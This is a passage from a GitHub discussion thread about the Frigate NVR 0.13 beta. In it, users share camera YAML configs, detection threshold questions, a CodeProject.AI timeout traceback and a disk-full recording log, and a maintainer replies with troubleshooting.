   - 0,480,340,480,325,275,276,273,277,213,335,212,343,0,0,0         - 704,480,704,0,325,0,331,208,366,212,368,278,328,277,322,480    back_porch:     enabled: true     live:       stream_name: back_porch     ffmpeg:       inputs:         - path: rtsp://admin:x@x:554/cam/realmonitor?channel=1&subtype=0 # connect directly to main camera stream for recording           roles:             - record         - path: rtsp://admin:x@x:554/cam/realmonitor?channel=1&subtype=1 # connect directly to camera substream for detection           roles:             - detect     zones:       backyard_porch:         coordinates: 103,285,115,480,704,480,704,90,538,25,530,152,513,143       backyard:         coordinates: 238,30,407,19,538,26,525,153,377,207,140,281,112,59       az_marker:         coordinates: 305,112,295,100,280,105,284,117     motion:       mask:         - 463,23,704,22,704,0,466,0 # Timestamp Overlay         - 480,41,494,41,493,109,476,109 # Windchime         - 223,0,704,0,704,97,549,20,408,20,302,17,133,52,118,58,135,221,144,360,120,396,163,480,0,480,0,0 # Ceiling         - 704,480,597,480,704,247 # Right side         - 469,480,348,480,335,448,403,397 # Charcoal grill     objects:       track:         - person       filters:         person:           threshold: 0.7 # 0.7 default           mask:             - 196,480,295,480,208,251,128,283 # Grill             - 318,42,319,66,279,67,271,45 # Bird bath             - 528,413,613,318,676,367,576,480,410,480,334,364,328,262,458,296,432,331 # Sofa         bird:           threshold: 0.4           min_score: 0.3    driveway:     enabled: true     live:       stream_name: driveway     ffmpeg:       inputs:         - path: rtsp://admin:x@x:554/cam/realmonitor?channel=1&subtype=0 # connect directly to main camera stream for recording           roles:             - record         - path: rtsp://admin:x@x:554/cam/realmonitor?channel=1&subtype=1 # connect directly to camera substream for detection           roles:             - detect             - audio     audio:       enabled: True # Override global False       listen:         - thunder         - rain         - yell         - speech         - bark         - scream     zones:       driveway_close:         coordinates: 267,202,290,340,336,480,565,480,704,480,704,337,704,91,596,38,587,148       driveway_far:         coordinates: 250,153,265,203,576,143,471,90,430,75,415,50,263,68,282,79       mailbox:         coordinates: 410,61,505,62,504,0,408,0         objects:           - car     motion:       mask:         - 516,25,704,29,704,0,513,0 # Timestamp         - 0,0,0,300,58,134,106,116,145,77,201,50,297,21,321,0 # Tree Left         - 704,0,704,236,584,146,604,0 # Right Wall     objects:       filters:         car:           threshold: 0.6           mask:             - 0,0,599,0,602,42,475,25,395,31,254,41,257,72,60,141,0,317,0,123         person:           mask:             - 516,0,511,95,502,102,505,0 # Tree Right             - 0,0,335,0,595,0,598,61,507,54,306,65,176,95,62,143,0,300 # Road             - 562,146,592,154,593,90,566,90 # shrub             - 206,46,210,98,190,105,188,42 # Tree Left       track:         - car         - person          front_door:     enabled: true     live:       stream_name: front_door     ffmpeg:       inputs:         - path: rtsp://admin:x@x:554/cam/realmonitor?channel=1&subtype=0 # connect directly to main camera stream for recording           roles:             - record         - path: rtsp://admin:x@x:554/cam/realmonitor?channel=1&subtype=1 # connect directly to camera substream for detection           roles:             - detect     detect: # need to manually set resolution for substream as it differs from the others       enabled: True # Override global True       width: 720       height: 576     zones:       front_porch:         coordinates: 366,91,585,58,589,576,350,576,0,576,0,531,166,452,319,363,377,356       walkway:         coordinates: 0,534,167,456,0,393,0,446     motion:       mask:         - 720,0,720,21,479,21,474,0 # Timestamp Overlay         - 37,31,319,201,523,199,500,0,0,0,0,40,22,47 # Ceiling     objects:       filters:         person:           mask:             - 380,301,386,439,302,419,292,408,292,335 # Chairs             - 720,316,557,308,535,23,720,23 # wreath    garage:     enabled: true     live:       stream_name: garage     ffmpeg:       inputs:         #- path: rtsp://127.0.0.1:8554/garage         - path: rtsp://admin:x@x:554/cam/realmonitor?channel=1&subtype=0 # connect directly to main camera stream for recording           roles:             - record         - path: rtsp://admin:x@x:554/cam/realmonitor?channel=1&subtype=1 # connect directly to camera substream for detection           roles:             - detect     motion:       mask:         - 704,0,704,32,510,30,508,0 # Timestamp Overlay         - 0,480,260,480,158,369,52,224,33,168,0,177 # Bench  birdseye:   enabled: True   mode: continuous     quality: 5   width: 1440   height: 1152  detect: # need to manually set resolution for substreams   width: 704   height: 480  record:   enabled: True   retain:        days: 14       mode: all   events:      retain:       default: 14       mode: active_objects       objects:         car: 4         bird: 2  snapshots:   enabled: True   timestamp: True   bounding_box: True   retain:     default: 14     objects:       car: 4       bird: 2  # Global Enable audio:   enabled: False  objects:   track:     - person # default person only  ffmpeg:   hwaccel_args: preset-vaapi   output_args:     record: preset-record-generic-audio-aac # encode audio in clips and recordings      detectors:   coral:     type: edgetpu     device: usb  ui:   live_mode: mse  ``` |
| --- |

Beta
Was this translation helpful?
Give feedback.

1
 You must be logged in to vote

All reactions

5 replies

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

edited

# {{editor}}'s edit

 {{actor}} deleted this content
.

# {{editor}}'s edit

Something went wrong.

#### [NickM-27](/NickM-27) [Oct 30, 2023](#discussioncomment-7429179) Collaborator Author Sponsor

 -

| your birdseye resolution is not using a standard aspect ratio, I tried to fix this but it seems to cause an issue with pixel mapping so instead the config will be considered invalid |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@YBonline](https://avatars.githubusercontent.com/u/11162258?s=60&v=4)](/YBonline)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [YBonline](/YBonline) [Oct 31, 2023](#discussioncomment-7429967)

 -

| So I'm getting the same issue as [aneisch](https://github.com/aneisch) with the random colors corrupted birdseye view... my resolution was 1920x1200... I tried deleting the resolution and let it do what it wants by default, and now whenever 2 of my panoramic cameras are appearing at the same time, every single camera goes onto the same line... infact, sometimes its with just one... but its a little unpredictable then. The panos have a detect resolution of 1920x536  I did have some funkiness where it had half the screen empty under the old algorithm for seemingly no reason (usually when my reolink 2 duo was active on the screen) but this got worse... you want my full config again or is there anything else to try first?  The motion detection does seem to be MUCH better for me with the regions. My cameras that always were active at night due to bugs being attracted to the light are finally not activating the motion detection... (assuming I'm not missing any real motion events, lol, I'm getting far fewer motion events, but it also just so happens that one of my facility door locks failed keeping everyone locked out so its not super unexpected 😣 ) |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@YBonline](https://avatars.githubusercontent.com/u/11162258?s=60&v=4)](/YBonline)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [YBonline](/YBonline) [Oct 31, 2023](#discussioncomment-7430010)

 -

| Here's a simple example where I think its fairly obvious it should be on 2 lines: [Simple Example](https://private-user-images.githubusercontent.com/11162258/279234460-33c9eebf-0bc6-4a3e-ab5b-87e01a0090f0.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii8xMTE2MjI1OC8yNzkyMzQ0NjAtMzNjOWVlYmYtMGJjNi00YTNlLWFiNWItODdlMDFhMDA5MGYwLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMjYzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWIxMWIyYzA1Mzc4OTlmYWVmNWU1ZjJhMmNkYjVlNThjYmJhYzA0YWFjN2VjYjFlNTdjNjI5YWM0Y2VjZWY5YmYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.GOYuuZzBnoV0HkZEX7AdXkopZyGaW-Lxawor4Aypla4)  Resolution of first camera is 1920x536, second is 1920x1080 |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Oct 31, 2023](#discussioncomment-7430050) Collaborator Author Sponsor

 -

| I've already put up a new addition to the logic. But will need to force resolutions to fit standard aspect ratios. |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@YBonline](https://avatars.githubusercontent.com/u/11162258?s=60&v=4)](/YBonline)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [YBonline](/YBonline) [Oct 31, 2023](#discussioncomment-7430156)

 -

| Alright, cool, just started running that version and after running for 5 minutes it seems better then ever! Thank you! |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

Comment options

# {{title}}

Something went wrong.

Quote reply

edited

# {{editor}}'s edit

 {{actor}} deleted this content
.

# {{editor}}'s edit

Something went wrong.

### [dz4news](/dz4news) [Oct 31, 2023](#discussioncomment-7430032) Sponsor

 -

| In beta 2, my dog would get identified correctly, when he was in the front yard...  [snapshot-1698350397 304515-zvy6ye](https://private-user-images.githubusercontent.com/57462035/279235047-f4f5d5d9-dcb4-42c3-b8f4-156a49cc0d96.jpg?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii81NzQ2MjAzNS8yNzkyMzUwNDctZjRmNWQ1ZDktZGNiNC00MmMzLWI4ZjQtMTU2YTQ5Y2MwZDk2LmpwZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMjYzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWRiYzYyY2QxZDk2OWU4NmMyMTNhZjU1NTI0MDBkZGFkODIzZTA5MGNlMDIyYjJmODc5YjhkODUxZDY1MWZjMzcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.KkjYO1LVRPs14HEyjptheFZbAkp6l2L5P207VpUI0Kk)  with beta3, he gets the red bounding box... but never gets identified. I have not changed my config... So whats the difference? I know the detection was improved/changed for beta3... so do I need to reduce my `min_score` and `threshold`?  ```       filters:         bird:           min_score: 0.85         vehicle:           min_area: 2000           max_area: 24000000           min_score: 0.85         amazon:           min_score: 0.75         fedex:           min_score: 0.75         ups:           min_score: 0.75         cat:           min_area: 3000           max_area: 100000           min_score: 0.90           threshold: 0.7         dog:           min_area: 2000           max_area: 10000           min_score: 0.90           threshold: 0.7         deer:           min_score: 0.85           threshold: 0.7         person:           min_score: 0.85           threshold: 0.7  ``` |
| --- |

Beta
Was this translation helpful?
Give feedback.

2
 You must be logged in to vote

All reactions

26 replies

Show 21 previous replies

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

edited

# {{editor}}'s edit

 {{actor}} deleted this content
.

# {{editor}}'s edit

Something went wrong.

#### [NickM-27](/NickM-27) [Nov 2, 2023](#discussioncomment-7460604) Collaborator Author Sponsor

 -

| IE a passing car on the road at the end of my driveway now has a region box that is close to the full vertical view of the camera instead of a little bigger than the car.  this sounds like the bug I just described fixing, nothing to do with the regions that are calculated. beta4 will fix the bug and offer tools for seeing the grid |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@bagobones](https://avatars.githubusercontent.com/u/1587701?s=60&v=4)](/bagobones)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [bagobones](/bagobones) [Nov 2, 2023](#discussioncomment-7460676)

 -

| Sounds good, will check it again with beta4, would make sense for the road as well if the grid is only based on events. As passing cars will not generate them but cars coming home into the driveway will. |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Nov 2, 2023](#discussioncomment-7460734) Collaborator Author Sponsor

 -

| I don't expect that to be a problem, the grid is based on timeline events. So they do require the event to be saved but timeline events can include times when the object is outside the zone like when it is first detected, last detected, becomes stationary / active, etc.  My camera with my driveway has no issues with this  [Screen Shot 2023-11-02 at 14 02 42 PM](https://private-user-images.githubusercontent.com/14866235/280114192-67c9ff3b-715c-41b6-8a3e-c7a66417a6c6.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii8xNDg2NjIzNS8yODAxMTQxOTItNjdjOWZmM2ItNzE1Yy00MWI2LThhM2UtYzdhNjY0MTdhNmM2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMjYzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWRhOTcwNWJlNDkyZjQ2OWRlM2NmZGY5ZDRlYjIzNzU0MGE3OWVlZmZkMzRkODQ3Yjk3ZTA1MmZiOTM5MGM2NTkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0._M4iOud2WoEkoeJaTG-7qAtti4ghbbKK_3qpCGPXbN8) |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@dz4news](https://avatars.githubusercontent.com/u/57462035?s=60&v=4)](/dz4news)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [dz4news](/dz4news) [Nov 5, 2023](#discussioncomment-7476909) Sponsor

 -

| Here is a screen shot with the grid for the same camera. [Screenshot 2023-11-04 at 7 43 47 PM](https://private-user-images.githubusercontent.com/57462035/280499831-1c872569-179a-4e94-82b7-01082f40dc90.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii81NzQ2MjAzNS8yODA0OTk4MzEtMWM4NzI1NjktMTc5YS00ZTk0LTgyYjctMDEwODJmNDBkYzkwLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMjYzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQ2MTg2MmVmNDRkNDM5M2VjNmRmMmIxMzU3OWJhNDgyY2RhYzVmZGVlMGQ0NjJlZTQxZjY1YTRmYWQwMDYyZTkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.fk7bzkaBsN6QtHyuvBGk5vfHkMgaULAMZGZIqvVTctw) Comparing to yours, there are some obvious holes in the grid and this actually holds true for all my cameras. Help me understand what I am looking at...  I am guessing that frigate is going to struggle identifying things that are outside of the grids... is that a correct thought?  I currently have my `min_score` pretty high to minimize false ids... do I need to reduce that to get more false ids in the non-grid areas?  Thanks for coding the grid overlay.. I think this will go a long way to understanding how things work. |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

edited

# {{editor}}'s edit

 {{actor}} deleted this content
.

# {{editor}}'s edit

Something went wrong.

#### [NickM-27](/NickM-27) [Nov 5, 2023](#discussioncomment-7476917) Collaborator Author Sponsor

 -

| Your whole grid is using the model size so I don't think this should be causing any issues. I'd expect the behavior you were seeing last time on beta 3 should be fixed.  I am guessing that frigate is going to struggle identifying things that are outside of the grids... is that a correct thought?  No, it simply means when there is motion in those areas it will use whatever size region holds the motion boxes instead of using an optimized size. However in the case of this camera they're all 320 anyway so the grid isn't going to change any behavior.  I currently have my min\_score pretty high to minimize false ids... do I need to reduce that to get more false ids in the non-grid areas?  No, these come from timeline items so the only times grids will get created is when an object is detected, lost, enters a zone, or becomes stationary / active. |
| --- |

Beta
Was this translation helpful?
Give feedback.

 👍
1

All reactions

* 👍
  1

Comment options

# {{title}}

Something went wrong.

Quote reply

### [Dvalin21](/Dvalin21) [Oct 31, 2023](#discussioncomment-7437646)

 -

| Hey guys, having an issue with 13beta3 and Codeproject.AI  On the Frigate side I get the following  ``` 2023-10-31 11:42:41.965563828  Process detector:deepstack: 2023-10-31 11:42:41.967441916  Traceback (most recent call last): 2023-10-31 11:42:41.967456050    File "/usr/local/lib/python3.9/dist-packages/urllib3/connectionpool.py", line 537, in _make_request 2023-10-31 11:42:41.967457330      response = conn.getresponse() 2023-10-31 11:42:41.967458755    File "/usr/local/lib/python3.9/dist-packages/urllib3/connection.py", line 461, in getresponse 2023-10-31 11:42:41.967478268      httplib_response = super().getresponse() 2023-10-31 11:42:41.967479628    File "/usr/lib/python3.9/http/client.py", line 1347, in getresponse 2023-10-31 11:42:41.967492749      response.begin() 2023-10-31 11:42:41.967494017    File "/usr/lib/python3.9/http/client.py", line 307, in begin 2023-10-31 11:42:41.967507868      version, status, reason = self._read_status() 2023-10-31 11:42:41.967509009    File "/usr/lib/python3.9/http/client.py", line 268, in _read_status 2023-10-31 11:42:41.967510164      line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1") 2023-10-31 11:42:41.967531378    File "/usr/lib/python3.9/socket.py", line 704, in readinto 2023-10-31 11:42:41.967532428      return self._sock.recv_into(b) 2023-10-31 11:42:41.967533460  socket.timeout: timed out 2023-10-31 11:42:41.967534397   2023-10-31 11:42:41.967535587  The above exception was the direct cause of the following exception: 2023-10-31 11:42:41.967536526   2023-10-31 11:42:41.967537589  Traceback (most recent call last): 2023-10-31 11:42:41.967550553    File "/usr/local/lib/python3.9/dist-packages/requests/adapters.py", line 486, in send 2023-10-31 11:42:41.967551706      resp = conn.urlopen( 2023-10-31 11:42:41.967552925    File "/usr/local/lib/python3.9/dist-packages/urllib3/connectionpool.py", line 845, in urlopen 2023-10-31 11:42:41.967553938      retries = retries.increment( 2023-10-31 11:42:41.967555182    File "/usr/local/lib/python3.9/dist-packages/urllib3/util/retry.py", line 470, in increment 2023-10-31 11:42:41.967556242      raise reraise(type(error), error, _stacktrace) 2023-10-31 11:42:41.967557419    File "/usr/local/lib/python3.9/dist-packages/urllib3/util/util.py", line 39, in reraise 2023-10-31 11:42:41.967558404      raise value 2023-10-31 11:42:41.967559650    File "/usr/local/lib/python3.9/dist-packages/urllib3/connectionpool.py", line 791, in urlopen 2023-10-31 11:42:41.967560676      response = self._make_request( 2023-10-31 11:42:41.967561999    File "/usr/local/lib/python3.9/dist-packages/urllib3/connectionpool.py", line 539, in _make_request 2023-10-31 11:42:41.967580834      self._raise_timeout(err=e, url=url, timeout_value=read_timeout) 2023-10-31 11:42:41.967582288    File "/usr/local/lib/python3.9/dist-packages/urllib3/connectionpool.py", line 371, in _raise_timeout 2023-10-31 11:42:41.967595433      raise ReadTimeoutError( 2023-10-31 11:42:41.967605705  urllib3.exceptions.ReadTimeoutError: HTTPConnectionPool(host='10.0.0.29', port=32168): Read timed out. (read timeout=0.1) 2023-10-31 11:42:41.967606675   2023-10-31 11:42:41.967607844  During handling of the above exception, another exception occurred: 2023-10-31 11:42:41.967608735   2023-10-31 11:42:41.967609732  Traceback (most recent call last): 2023-10-31 11:42:41.967610898    File "/usr/lib/python3.9/multiprocessing/process.py", line 315, in _bootstrap 2023-10-31 11:42:41.967611850      self.run() 2023-10-31 11:42:41.967613030    File "/usr/lib/python3.9/multiprocessing/process.py", line 108, in run 2023-10-31 11:42:41.967614124      self._target(*self._args, **self._kwargs) 2023-10-31 11:42:41.967615303    File "/opt/frigate/frigate/object_detection.py", line 125, in run_detector 2023-10-31 11:42:41.967616415      detections = object_detector.detect_raw(input_frame) 2023-10-31 11:42:41.967617590    File "/opt/frigate/frigate/object_detection.py", line 75, in detect_raw 2023-10-31 11:42:41.967618750      return self.detect_api.detect_raw(tensor_input=tensor_input) 2023-10-31 11:42:41.967620003    File "/opt/frigate/frigate/detectors/plugins/deepstack.py", line 52, in detect_raw 2023-10-31 11:42:41.967621017      response = requests.post( 2023-10-31 11:42:41.967622208    File "/usr/local/lib/python3.9/dist-packages/requests/api.py", line 115, in post 2023-10-31 11:42:41.967623347      return request("post", url, data=data, json=json, **kwargs) 2023-10-31 11:42:41.967624622    File "/usr/local/lib/python3.9/dist-packages/requests/api.py", line 59, in request 2023-10-31 11:42:41.967625715      return session.request(method=method, url=url, **kwargs) 2023-10-31 11:42:41.967627024    File "/usr/local/lib/python3.9/dist-packages/requests/sessions.py", line 589, in request 2023-10-31 11:42:41.967628032      resp = self.send(prep, **send_kwargs) 2023-10-31 11:42:41.967629232    File "/usr/local/lib/python3.9/dist-packages/requests/sessions.py", line 703, in send 2023-10-31 11:42:41.967642837      r = adapter.send(request, **kwargs) 2023-10-31 11:42:41.967644267    File "/usr/local/lib/python3.9/dist-packages/requests/adapters.py", line 532, in send 2023-10-31 11:42:41.967645305      raise ReadTimeout(e, request=request) 2023-10-31 11:42:41.967646764  requests.exceptions.ReadTimeout: HTTPConnectionPool(host='10.0.0.29', port=32168): Read timed out. (read timeout=0.1)  ```  On the Code Project Side I get this  ``` 1:46:39:ObjectDetection (Coral): Rec'd request for ObjectDetection (Coral) command 'detect' (...eb3b4e) took 1002ms 11:46:50:Face Processing: Rec'd request for Face Processing command 'recognize' (...9521e4) took 171ms 11:46:59:ObjectDetection (Coral): Rec'd request for ObjectDetection (Coral) command 'detect' (...871781) took 1002ms 11:47:29:ObjectDetection (Coral): Rec'd request for ObjectDetection (Coral) command 'detect' (...4ca4c4) took 1002ms 11:47:48:ObjectDetection (Coral): Rec'd request for ObjectDetection (Coral) command 'detect' (...b7893e) took 1002ms  ```  So from what I can tell information is being communicated between the two, but Frigate is saying that its timing out. Any suggestions? Thanks in advance. |
| --- |

Beta
Was this translation helpful?
Give feedback.

1
 You must be logged in to vote

All reactions

13 replies

Show 8 previous replies

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Oct 31, 2023](#discussioncomment-7438336) Collaborator Author Sponsor

 -

| [Screen Shot 2023-10-31 at 12 12 35 PM](https://private-user-images.githubusercontent.com/14866235/279475851-f45e294f-d14e-43c6-8ed3-5e417c6f7a1c.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii8xNDg2NjIzNS8yNzk0NzU4NTEtZjQ1ZTI5NGYtZDE0ZS00M2M2LThlZDMtNWU0MTdjNmY3YTFjLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMjYzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTgxNWYyZWE2ODMzNzAyOTRlMjUzYjM0NWYzNWU4ZGZiOGFmM2MzYTQwNGViZTJkOGZjMjI0ZWY1ZWIzZjM3NDUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.9Zf52_tc3sU5Zjo8LsoOSL7oA8dL-NIm2oJIs7O4hQM) |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@Dvalin21](https://avatars.githubusercontent.com/u/7469013?s=60&v=4)](/Dvalin21)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [Dvalin21](/Dvalin21) [Oct 31, 2023](#discussioncomment-7438350)

 -

| Then I have it way too high. In the config, I have it as 1.2 when it should be 1.002 |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Oct 31, 2023](#discussioncomment-7438355) Collaborator Author Sponsor

 -

| Like I said there will be additional latency for the transmission as codeproject just shows the inference time itself |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@Dvalin21](https://avatars.githubusercontent.com/u/7469013?s=60&v=4)](/Dvalin21)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [Dvalin21](/Dvalin21) [Oct 31, 2023](#discussioncomment-7438367)

 -

| Gotcha, Thanks. Again awesome work guys |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@Dvalin21](https://avatars.githubusercontent.com/u/7469013?s=60&v=4)](/Dvalin21)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [Dvalin21](/Dvalin21) [Nov 1, 2023](#discussioncomment-7448095)

 -

| Just as a heads up, I am speaking to the guys over at CodeProject about the slow inference. Hopefully this would get fixed soon. Its interesting though. They are using Tensor libraries with the Coral instead of COCO libraries. I wonder if that is whats making the difference. Anyway. Just wanted to leave this info. |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

Comment options

# {{title}}

Something went wrong.

Quote reply

edited

# {{editor}}'s edit

 {{actor}} deleted this content
.

# {{editor}}'s edit

Something went wrong.

### [aneisch](/aneisch) [Oct 31, 2023](#discussioncomment-7437723)

 -

| Seeing this morning that my disk is full and old recordings aren't being discarded to make more room:  My config [here](https://github.com/blakeblackshear/frigate/discussions/8366#discussioncomment-7429171)  ``` 2023-10-31 06:51:19.364093440  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Unable to convert /tmp/cache/ptz-20231031065041.mp4 to /media/frigate/recordings/2023-10-31/11/ptz/50.41.mp4 2023-10-31 06:51:19.364099446  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Input #0, mov,mp4,m4a,3gp,3g2,mj2, from '/tmp/cache/ptz-20231031065041.mp4': 2023-10-31 06:51:19.364101989    Metadata: 2023-10-31 06:51:19.364104476      major_brand     : isom 2023-10-31 06:51:19.364106898      minor_version   : 512 2023-10-31 06:51:19.364109473      compatible_brands: isomiso2avc1mp41 2023-10-31 06:51:19.364111896      title           : go2rtc/ 2023-10-31 06:51:19.364114338      encoder         : Lavf59.27.100 2023-10-31 06:51:19.364116869    Duration: 00:00:10.04, start: 0.000000, bitrate: 904 kb/s 2023-10-31 06:51:19.364120750    Stream #0:0[0x1](und): Video: h264 (Main) (avc1 / 0x31637661), yuvj420p(pc, bt470bg/bt470bg/bt709, progressive), 1920x1080, 853 kb/s, 30.03 fps, 90k tbr, 90k tbn (default) 2023-10-31 06:51:19.364122885      Metadata: 2023-10-31 06:51:19.364125302        handler_name    : VideoHandler 2023-10-31 06:51:19.364127756        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.364130950    Stream #0:1[0x2](und): Audio: aac (LC) (mp4a / 0x6134706D), 16000 Hz, mono, fltp, 48 kb/s (default) 2023-10-31 06:51:19.364133075      Metadata: 2023-10-31 06:51:19.364135445        handler_name    : SoundHandler 2023-10-31 06:51:19.364137963        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.364140890  /media/frigate/recordings/2023-10-31/11/ptz/50.41.mp4: No space left on device 2023-10-31 06:51:19.364142995   2023-10-31 06:51:19.380239623  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Unable to convert /tmp/cache/ptz-20231031065101.mp4 to /media/frigate/recordings/2023-10-31/11/ptz/51.01.mp4 2023-10-31 06:51:19.380246228  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Input #0, mov,mp4,m4a,3gp,3g2,mj2, from '/tmp/cache/ptz-20231031065101.mp4': 2023-10-31 06:51:19.380248756    Metadata: 2023-10-31 06:51:19.380251335      major_brand     : isom 2023-10-31 06:51:19.380253779      minor_version   : 512 2023-10-31 06:51:19.380256280      compatible_brands: isomiso2avc1mp41 2023-10-31 06:51:19.380258777      title           : go2rtc/ 2023-10-31 06:51:19.380261190      encoder         : Lavf59.27.100 2023-10-31 06:51:19.380263811    Duration: 00:00:08.06, start: 0.000000, bitrate: 903 kb/s 2023-10-31 06:51:19.380267641    Stream #0:0[0x1](und): Video: h264 (Main) (avc1 / 0x31637661), yuvj420p(pc, bt470bg/bt470bg/bt709, progressive), 1920x1080, 853 kb/s, 29.97 fps, 90k tbr, 90k tbn (default) 2023-10-31 06:51:19.380269826      Metadata: 2023-10-31 06:51:19.380272376        handler_name    : VideoHandler 2023-10-31 06:51:19.380274848        vendor_id       : [0][0][0][0] 2023-10-31 